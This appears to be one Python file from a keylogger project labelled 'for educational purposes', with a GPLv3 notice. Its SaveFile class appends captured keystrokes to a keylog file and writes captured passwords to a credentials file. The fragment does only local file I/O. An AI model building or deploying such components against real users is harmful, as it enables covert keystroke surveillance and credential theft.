# This script is a keylogger for educational purposes only.
# Author: @juanmafe.
# GPLv3 2022.

from CheckFile import CheckFile
from Properties import Properties

class SaveFile():

	def save_in_keylog(key):
		CheckFile.check_keylog_file()
		fileToWrite = open(Properties.path_keylog_file, "a")
		fileToWrite.write(key)
		fileToWrite.close()


	def save_in_credentials(password):
		CheckFile.check_credentials_file()
		fileToWrite = open(Properties.path_credentials_file, "w+")
		fileToWrite.write(password)
		fileToWrite.close()

#EOF